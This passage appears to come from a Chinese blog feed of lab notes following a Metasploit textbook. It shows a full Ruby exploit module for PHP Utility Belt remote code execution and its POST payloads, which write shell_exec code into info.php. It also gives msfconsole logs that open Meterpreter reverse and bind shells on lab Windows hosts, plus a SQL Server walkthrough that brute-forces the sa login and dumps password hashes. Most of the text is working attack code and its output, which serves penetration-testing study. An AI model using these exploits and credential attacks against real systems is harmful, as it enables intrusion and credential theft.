class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h3 id="代码简要分析-1">3、代码简要分析</h3>
<p>TCP
server库提供了处理传入请求所需的各种方法和额外的选项，例如SRVHOST、
SRVPORT和SSL</p>
<p>client.put(sploit)：将恶意数据发送到目标</p>
<p>client.get_once：这个渗透模块需要向目标发送两次数据，所以我们只能在两次发送之间使用client.get_once函数保证数据是分两次发送的，否则这两块数据可能会被合并成一个单元被一起发送出去。</p>
<p>handler(client)：查找从渗透模块传回的会话</p>
<p>代码中使用了client对象。这是因为从指定目标返回的传入请求被看作是一个独立的对象，允许同一时间由多个目标连接</p>
<h2 id="msf中测试">4. msf中测试</h2>
<h3 id="kali-msf操作">1、kali msf操作</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8 </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; <span class="built_in">set</span> srvhost 10.10.10.153</span><br><span class="line">srvhost =&gt; 10.10.10.153</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; <span class="built_in">set</span> srvport 8080</span><br><span class="line">srvport =&gt; 8080</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; <span class="built_in">set</span> lhost  10.10.10.153</span><br><span class="line">lhost =&gt; 10.10.10.153</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; exploit </span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.10.153:8888 </span><br><span class="line">[*] Started service listener on 10.10.10.153:8080 </span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
<h3 id="xp端操作">2、XP端操作</h3>
<p><strong>XP启动BSplayer，并打开URL：http://10.10.10.153:8080</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211204202451310-1099643251.png" /></p>
<ul>
<li><strong>XP在试图与渗透服务器（kali）建立连接时，Meterpreter攻击载荷就会被发送至XP上，最终kali获得Meterpreter控制</strong></li>
</ul>
<h3 id="kali-端效果">3、kali 端效果：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">    </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt;</span><br><span class="line">[*] Client Connected</span><br><span class="line">[*] Client Connected</span><br><span class="line">[*] Sending stage (179779 bytes) to 10.10.10.132</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.153:8888 -&gt; 10.10.10.132:1105) at 2021-10-03 05:29:14 -0400</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">[*] <span class="built_in">exec</span>: <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">/root</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                             Connection</span><br><span class="line">  --  ----  ----                     -----------                             ----------</span><br><span class="line">  1         meterpreter x86/windows  WINXP-Z9M8R8-1\z9m8r8 @ WINXP-Z9M8R8-1  10.10.10.153:8888 -&gt; 10.10.10.132:1105 (10.10.10.132)</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows/z9m8r8_test/bsplayer2_68_seh_overflow_z9m8r8) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WINXP-Z9M8R8-1\z9m8r8</span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer: WINXP-Z9M8R8-1</span><br><span class="line">OS      : Windows XP (Build 2600, Service Pack 2).</span><br><span class="line">Architecture    : x86</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>将基于 Web 的 RCE 导入 Metasploit</title>
    <url>/2021/12/01/%E5%B0%86%E5%9F%BA%E4%BA%8E%20Web%20%E7%9A%84%20RCE%20%E5%AF%BC%E5%85%A5%20Metasploit/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：kali 2019-3</strong></p>
<p><strong>靶机环境：</strong></p>
<p>Windows Server2008 R2 x64</p>
<p><strong>phpStudy 2016 PHP-5.4.45</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201084936234-1908912077.png" /></p>
<p><strong>漏洞：</strong></p>
<p><strong>PHP utility belt远程代码执行漏洞</strong> ，可参见：<a
href="https://www.exploit-db.com/exploits/38901"
class="uri">https://www.exploit-db.com/exploits/38901</a></p>
<p><strong>漏洞简要介绍</strong></p>
<p>这个远程代码执行漏洞通过一个POST请求的代码参数触发，服务器在接收到这段精心构造的数据请求并对其进行处理之时就会执行服务器端代码。现在来看看如何对这个漏洞进行手动渗透。</p>
<p>使用fwrite以可写模式打开名为info.php的文件，然后将</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="string">&quot;net user&quot;</span>; <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$a</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>写入到文件中</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085025516-1909489006.png" /></p>
<p>命令执行之后，将会创建一个名为info.php的新文件，并将PHP中的信息写入到这个文件中。接下来，只需浏览info.php文件，就可以看到执行命令的结果</p>
<p><strong>文件夹中创建了info.php</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085039541-344520801.png" /></p>
<p><strong>浏览器访问info.php,该页面列出了所有用户名</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201085052766-724902179.png" /></p>
<h2 id="将-http-渗透模块导入到-metasploit-中">2. 将 HTTP 渗透模块导入到
Metasploit 中</h2>
<h3 id="渗透代码">1、渗透代码</h3>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt;<span class="title class_">Msf</span><span class="symbol">:</span><span class="symbol">:Exploit</span><span class="symbol">:</span><span class="symbol">:Remote</span></span><br><span class="line"><span class="keyword">include</span> <span class="title class_">Msf::Exploit::Remote::HttpClient</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">info=&#123;&#125;</span>)</span><br><span class="line">  <span class="variable language_">super</span>(update_info(info,</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;PHP Utility Belt Remote Code Execution&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">          This module exploits a remote code execution vulnerability in PHP Utility Belt</span></span><br><span class="line"><span class="string">        &#125;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;DisclosureDate&#x27;</span> =&gt; <span class="string">&#x27;2021-10-03&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Platform&#x27;</span> =&gt; <span class="string">&#x27;PHP&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Payload&#x27;</span> =&gt; &#123;</span><br><span class="line">        <span class="string">&#x27;Space&#x27;</span> =&gt; <span class="number">2000</span>,</span><br><span class="line">        <span class="string">&#x27;DisableNops&#x27;</span> =&gt; <span class="literal">true</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&#x27;Targets&#x27;</span> =&gt; [</span><br><span class="line">        [<span class="string">&#x27;PHP Utility Belt&#x27;</span>,&#123;&#125;]</span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&#x27;DefaultTarget&#x27;</span> =&gt; <span class="number">0</span></span><br><span class="line">    ))</span><br><span class="line">  register_options(</span><br><span class="line">    [</span><br><span class="line">      <span class="title class_">OptString</span>.new(<span class="string">&#x27;TARGETURI&#x27;</span>,[<span class="literal">true</span>,<span class="string">&#x27;The path to PHP Utility Belt&#x27;</span>,<span class="string">&#x27;php-utility-belt/ajax.php&#x27;</span>]),</span><br><span class="line">      <span class="title class_">OptString</span>.new(<span class="string">&#x27;CHECKURI&#x27;</span>,[<span class="literal">false</span>,<span class="string">&#x27;Checking Purpose&#x27;</span>,<span class="string">&#x27;/php-utilitybelt/info.php&#x27;</span>]),</span><br><span class="line">    ],<span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">  )</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span></span><br><span class="line">  send_request_cgi(</span><br><span class="line">    <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),</span><br><span class="line">    <span class="string">&#x27;vars_post&#x27;</span> =&gt; &#123;</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&quot;fwrite(fopen(&#x27;info.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php echo phpinfo();?&gt;&#x27;);&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  resp = send_request_raw(</span><br><span class="line">    &#123;<span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(datastore[<span class="string">&#x27;CHECKURI&#x27;</span>]),<span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;GET&#x27;</span>&#125;)</span><br><span class="line">  <span class="keyword">if</span> resp.body =~ <span class="regexp">/phpinfo()/</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Vulnerable</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Exploit</span><span class="symbol">:</span><span class="symbol">:CheckCode</span><span class="symbol">:</span><span class="symbol">:Safe</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span> </span><br><span class="line">  send_request_cgi(</span><br><span class="line">    <span class="string">&#x27;method&#x27;</span> =&gt; <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span> =&gt; normalize_uri(target_uri.path),</span><br><span class="line">    <span class="string">&#x27;vars_post&#x27;</span> =&gt; &#123;</span><br><span class="line">      <span class="string">&#x27;code&#x27;</span> =&gt; payload.encoded</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h3 id="代码简要分析">2、代码简要分析</h3>
<p><strong>因为现在的漏洞在一个Web应用程序中，而不是在之前的那种软件程序中，所以要将DisableNops的值设置为true以关闭攻击载荷中的NOP</strong></p>
<p><strong>漏洞在ajax.php文件中，因此要将TARGETURI的值设置为ajax.php文件的位置。</strong></p>
<p><strong>check 函数</strong></p>
<ul>
<li>将URI的值设置为以普通格式表示的目标URI</li>
<li>POST的参数CODE的值为fwrite(fopen('info.php','w'),'<?php echo phpinfo();?>');。</li>
<li>攻击载荷将会创建一个名为info.php的新文件。当代码执行的时候，这个文件将会展示所有的PHP信息。</li>
<li>使用send_request_raw获取新创建的info.php文件的内容</li>
<li>将保存在resp中的body部分与表达式phpinfo()匹配比较，评判漏洞是否有效</li>
</ul>
<p><strong>exploit 函数分析同理</strong></p>
<h3 id="保存路径">3、保存路径</h3>
<pre><code>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test# ls
pcman_cwd_z9m8r8_test.rb php_utility_belt_remote_code_execution.rb</code></pre>
<h3 id="代码调试">4、代码调试</h3>
<pre><code>root@kali:/usr/share/metasploit-framework/modules/exploits/windows/z9m8r8_test# ../../../../tools/dev/msftidy.rb php_utility_belt_remote_code_execution.rb
php_utility_belt_remote_code_execution.rb - [INFO] No CVE references found. Please check before you land!
php_utility_belt_remote_code_execution.rb - [ERROR] Unable to determine super class　　#未搞明白！但也没影响到获取Meterpreter
php_utility_belt_remote_code_execution.rb:48 - [WARNING] Spaces at EOL</code></pre>
<p><strong>报错未解决，有会的老哥可评论说下，非常感谢！</strong></p>
<h3 id="补充">5、补充</h3>
<p>在用Metasploit开发基于Web的渗透程序时，最重要的就是要弄清楚相关的Web函数、使用这些函数的方法，这些函数的参数以及知道漏洞的确切位置（该示例中的漏洞所在位置是CODE参数处）。</p>
<p>Web应用程序使用的重要函数都可以在/usr/share/metasploit-
framework/lib/msf/core/exploits/http下的client.rb库文件中找到。另外，在/usr/share/metasploit-
framework/lib/rex/proto/http下的client.rb文件和client-
request.rb文件包含着关于GET和POST请求的核心变量和方法。</p>
<p>如果想知道都需要将哪些值传递给这些函数，就需要对REX中的库文件进行研究。
REX库文件提供了与请求类型相关的下列头文件，如下图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211201090548227-1269470317.png" /></p>
<h2 id="msf-运行测试">3. msf 运行测试</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit/windows/z9m8r8_test/php_utility_belt_remote_code_execution </span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt; <span class="built_in">set</span> payload php/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; php/meterpreter/bind_tcp</span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt; <span class="built_in">set</span> rhost 10.10.10.140</span><br><span class="line">rhost =&gt; 10.10.10.140 msf5 exploit(windows /z9m8r8_test/php_utility_belt_remote_code_execution) &gt;check</span><br><span class="line"> [*] 10.10.10.140:80 - The target is not exploitable.　　　　　　　　　　　　　　　　　　<span class="comment">#check函数那个匹配有问题，懒得改了，明白思路即可</span></span><br><span class="line">msf5 exploit(windows/z9m8r8_test/php_utility_belt_remote_code_execution) &gt;exploit </span><br><span class="line"></span><br><span class="line">[*] Started <span class="built_in">bind</span> TCP handler against 10.10.10.140:4444</span><br><span class="line">[*] Sending stage (38247 bytes) to 10.10.10.140</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.10.152:46353 -&gt; 10.10.10.140:4444) at 2021-10-02 22:15:27 -0400 meterpreter &gt;sysinfo </span><br><span class="line">Computer: WIN-GOFSH0NNHLM</span><br><span class="line">OS  : Windows NT WIN-GOFSH0NNHLM 6.1 build 7601 (Windows Server 2008 R2 Enterprise Edition Service Pack 1) i586</span><br><span class="line">Meterpreter : php/windows</span><br><span class="line">   meterpreter&gt; </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库渗透（以SQL Server为例）</title>
    <url>/2021/12/07/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B8%97%E9%80%8F%EF%BC%88%E4%BB%A5SQL%20Server%E4%B8%BA%E4%BE%8B%EF%BC%89/</url>
    <content><![CDATA[<h2 id="实验环境">1. 实验环境</h2>
<p><strong>攻击机：</strong></p>
<p><strong>kali 2019-3</strong></p>
<p><strong>靶机环境：</strong></p>
<p><strong>装有SQL Server 2008 R2
的Windows10（192.168.1.104）</strong></p>
<h2 id="实验步骤">2. 实验步骤</h2>
<h3 id="使用-nmap-对-sql-server-进行踩点">1、使用 Nmap 对 SQL Server
进行踩点</h3>
<h4
id="对目标的1433端口进行一次服务侦测来完成对目标系统的sql-server踩点工作">（1）对目标的1433端口进行一次服务侦测来完成对目标系统的SQL
Server踩点工作</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; db_nmap -sV -p 1433 192.168.1.104</span><br><span class="line">[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:41 EDT</span><br><span class="line">[*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">[*] Nmap: Host is up (0.011s latency).</span><br><span class="line">[*] Nmap: PORT     STATE SERVICE  VERSION</span><br><span class="line">[*] Nmap: 1433/tcp open  ms-sql-s Microsoft SQL Server 2008 R2 10.50.1600; RTM</span><br><span class="line">[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line">[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">[*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.08 seconds</span><br><span class="line">msf5 &gt;services </span><br><span class="line">Services</span><br><span class="line">========</span><br><span class="line"></span><br><span class="line">host           port  proto  name      state  info</span><br><span class="line">----           ----  -----  ----      -----  ----</span><br><span class="line">192.168.1.104  1433  tcp    ms-sql-s  open   Microsoft SQL Server 2008 R2 10.50.1600; RTM</span><br></pre></td></tr></table></figure>
<h4
id="对udp端口1434的服务侦测扫描">（2）对UDP端口1434的服务侦测扫描</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; db_nmap -sU -sV -p 1434 192.168.1.104</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<h4
id="使用nmap脚本来获取目标数据库的信息">（3）使用Nmap脚本来获取目标数据库的信息</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> msf5 &gt; db_nmap -sU --script=ms-sql-info -p 1434 192.168.1.104</span><br><span class="line">   [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:56 EDT</span><br><span class="line">   [*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">   [*] Nmap: Host is up (0.00087s latency).</span><br><span class="line">   [*] Nmap: PORT     STATE         SERVICE</span><br><span class="line">   [*] Nmap: 1434/udp open|filtered ms-sql-m</span><br><span class="line">   [* ] Nmap: Host script results:</span><br><span class="line">   [*] Nmap: | ms-sql-info:</span><br><span class="line">   [*] Nmap: |   192.168.1.104:1433:</span><br><span class="line">   [*] Nmap: |     Version:</span><br><span class="line">   [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM</span><br><span class="line">   [*] Nmap: |       number: 10.50.1600.00</span><br><span class="line">   [*] Nmap: |       Product: Microsoft SQL Server 2008 R2</span><br><span class="line">   [*] Nmap: |       Service pack level: RTM</span><br><span class="line">   [*] Nmap: |       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">   [*] Nmap: |_    TCP port: 1433</span><br><span class="line">   [*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.71 seconds</span><br><span class="line">msf5&gt; db_nmap -sT --script=ms-sql-info -p 1433 192.168.1.104</span><br><span class="line">   [*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-05 08:59 EDT</span><br><span class="line">   [*] Nmap: Nmap scan report <span class="keyword">for</span> 192.168.1.104</span><br><span class="line">   [*] Nmap: Host is up (0.0011s latency).</span><br><span class="line">   [*] Nmap: PORT     STATE SERVICE</span><br><span class="line">   [*] Nmap: 1433/tcp open  ms-sql- s</span><br><span class="line">   [*] Nmap: Host script results:</span><br><span class="line">   [*] Nmap: | ms-sql-info:</span><br><span class="line">   [*] Nmap: |   192.168.1.104:1433:</span><br><span class="line">   [*] Nmap: |     Version:</span><br><span class="line">   [*] Nmap: |       name: Microsoft SQL Server 2008 R2 RTM</span><br><span class="line">   [*] Nmap: |       number: 10.50.1600.00</span><br><span class="line">   [*] Nmap: |       Product: Microsoft SQL Server 2008 R2</span><br><span class="line">   [*] Nmap: |       Service pack level: RTM</span><br><span class="line">   [*] Nmap: |       Post-SP patches applied: <span class="literal">false</span></span><br><span class="line">   [*] Nmap: |_    TCP port: 1433</span><br><span class="line">   [*] Nmap: Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 5.26 seconds</span><br></pre></td></tr></table></figure>
<h3 id="暴力破解密码">2、暴力破解密码</h3>
<p><strong>对应模块auxiliary/scanner/mssql/mssql_login
，依据提示设置相应爆破字典，run即可。</strong></p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/mssql/mssql_login </span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_login) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/scanner/mssql/mssql_login):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       BLANK_PASSWORDS      <span class="literal">false</span>            no        Try blank passwords <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">       BRUTEFORCE_SPEED     5                <span class="built_in">yes</span>       How fast to bruteforce, from 0 to 5</span><br><span class="line">       DB_ALL_CREDS         <span class="literal">false</span>            no        Try each user/password couple stored <span class="keyword">in</span> the current database</span><br><span class="line">       DB_ALL_PASS          <span class="literal">false</span>            no        Add all passwords <span class="keyword">in</span> the current database to the list</span><br><span class="line">       DB_ALL_USERS         <span class="literal">false</span>            no        Add all <span class="built_in">users</span> <span class="keyword">in</span> the current database to the list</span><br><span class="line">       PASSWORD                              no        A specific password to authenticate with</span><br><span class="line">       PASS_FILE                             no        File containing passwords, one per line</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       STOP_ON_SUCCESS      <span class="literal">false</span>            <span class="built_in">yes</span>       Stop guessing when a credential works <span class="keyword">for</span> a host</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       THREADS              1                <span class="built_in">yes</span>       The number of concurrent threads</span><br><span class="line">       USERNAME                              no        A specific username to authenticate as</span><br><span class="line">       USERPASS_FILE                         no        File containing <span class="built_in">users</span> and passwords separated by space, one pair per line</span><br><span class="line">       USER_AS_PASS         <span class="literal">false</span>            no        Try the username as the password <span class="keyword">for</span> all <span class="built_in">users</span></span><br><span class="line">       USER_FILE                             no        File containing usernames, one per line</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">       VERBOSE              <span class="literal">true</span>             <span class="built_in">yes</span>       Whether to <span class="built_in">print</span> output <span class="keyword">for</span> all attempts</span><br><span class="line">    </span><br><span class="line"> msf5 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(scanner /mssql/mssql_login) &gt;<span class="built_in">set</span> username sa　　　　　　　　<span class="comment">#默认账户名基本都是 sa</span></span><br><span class="line">    username =&gt; sa</span><br><span class="line">   msf5 auxiliary(scanner/mssql/mssql_login) &gt; <span class="built_in">set</span> password 123456　　　　　　　　<span class="comment">#这里偷个懒，一般情况是需要对 pass_file 参数指定密码字典的</span></span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(scanner /mssql/mssql_login) &gt; <span class="built_in">set</span> threads 10　　　　　　<span class="comment">#线程数</span></span><br><span class="line">    threads =&gt; 10 msf5 auxiliary(scanner /mssql/mssql_login) &gt;run</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433    - 192.168.1.104:1433 - MSSQL - Starting authentication scanner.</span><br><span class="line">   [+] 192.168.1.104:1433    - 192.168.1.104:1433 - Login Successful: WORKSTATION\sa:123456</span><br><span class="line">    [*] 192.168.1.104:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
<h3 id="捕获服务器的口令">3、捕获服务器的口令</h3>
<p>对应模块：auxiliary/scanner/mssql/mssql_hashdump，操作如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/mssql/mssql_hashdump </span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/scanner/mssql/mssql_hashdump):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       PASSWORD                              no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       THREADS              1                <span class="built_in">yes</span>       The number of concurrent threads</span><br><span class="line">       USERNAME             sa               no        The username to authenticate as</span><br><span class="line">       USE_WINDOWS_AUTHENT  <span class="literal">false</span>            <span class="built_in">yes</span>       Use windows authentification (requires DOMAIN option <span class="built_in">set</span>)</span><br><span class="line">    </span><br><span class="line">   msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt; <span class="built_in">set</span> rhosts 192.168.1.104</span><br><span class="line">    rhosts =&gt; 192.168.1.104 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; <span class="built_in">set</span> password 123456</span><br><span class="line">    password =&gt; 123456 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt; <span class="built_in">set</span> threads 10</span><br><span class="line">    threads =&gt; 10 msf5 auxiliary(scanner /mssql/mssql_hashdump) &gt;run</span><br><span class="line">    </span><br><span class="line">    [*] 192.168.1.104:1433    - Instance Name: nil</span><br><span class="line">[+] 192.168.1.104:1433    - Saving mssql05 = sa:0100daf63……　　　　　</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = <span class="comment">##MS_PolicyEventProcessingLogin##:0100a8df1bd75……</span></span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = <span class="comment">##MS_PolicyTsqlExecutionLogin##:0100b5e6b……</span></span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = admin:0100f72e3d144e12782……</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 = coach:010060e……</span><br><span class="line">    [+] 192.168.1.104:1433    - Saving mssql05 =student:01004ac65 ……</span><br><span class="line">    [*] 192.168.1.104:1433    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">    [*] Auxiliary module execution completed</span><br><span class="line">    msf5 auxiliary(scanner/mssql/mssql_hashdump) &gt; </span><br></pre></td></tr></table></figure>
<ul>
<li><strong>可以使用第三方工具来对这些哈希值进行破解</strong></li>
</ul>
<h3 id="浏览-sql-server">4、浏览 SQL Server</h3>
<p><strong>利用已取得的目标数据库的用户名和密码。登录到这个服务器上从该数据库收集重要的信息，比如存储过程、数据库的数量和名称、可登录到数据库的Windows组、数据库中的文件以及一些参数。</strong></p>
<p><strong>对应模块：auxiliary/admin/mssql/mssql_enum，操作如下（run之后的结果是有所省略的）：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    msf5 &gt; use auxiliary/admin/mssql/mssql_enum</span><br><span class="line">    msf5 auxiliary(admin/mssql/mssql_enum) &gt;show options </span><br><span class="line">    </span><br><span class="line">    Module options (auxiliary/admin/mssql/mssql_enum):</span><br><span class="line">    </span><br><span class="line">       Name                 Current Setting  Required  Description</span><br><span class="line">       ----                 ---------------  --------  -----------</span><br><span class="line">       PASSWORD                              no        The password <span class="keyword">for</span> the specified username</span><br><span class="line">       RHOSTS                                <span class="built_in">yes</span>       The target address range or CIDR identifier</span><br><span class="line">       RPORT                1433             <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">       TDSENCRYPTION        <span class="literal">false</span>            <span class="built_in">yes</span>       Use TLS/SSL <span class="keyword">for</span> TDS data <span class="string">&quot;Force Encryption&quot;</span></span><br><span class="line">       USERNAME             sa               no        The username to authenticate as</span><br><span class="line">       